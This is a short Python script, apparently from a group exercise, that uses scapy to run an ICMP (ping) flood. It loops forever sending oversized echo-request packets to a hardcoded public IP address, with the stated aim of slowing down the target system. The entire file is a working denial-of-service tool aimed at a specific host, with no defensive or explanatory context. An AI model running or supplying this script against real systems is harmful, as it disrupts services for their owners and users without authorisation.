"""
    +++++ ICMP (Ping) Flood +++++

    The huge number of ICMP Echo Request (ping) to slow down the target system
"""

from scapy.all import *
import random

# Define a payload to send to the web server
payload = "GROUP1" * 3000;

# Enter the IP Address of the target
#targetIP = input("Enter IP address of target: ");
targetIP = "44.228.239.90";

# This counter is used to count the number of packets are sent.
packetIP = 0;

while(True):
    # Send a large packet to the target
    IP_Packet = IP(dst = targetIP);
    ICMP_Packet = ICMP();
    packet = IP_Packet / ICMP_Packet / payload;
    """ Send and receive packets at layer 3 """
    sr1(packet);

    packetIP = packetIP + 1;
    print("Packet sent no# ", packetIP);
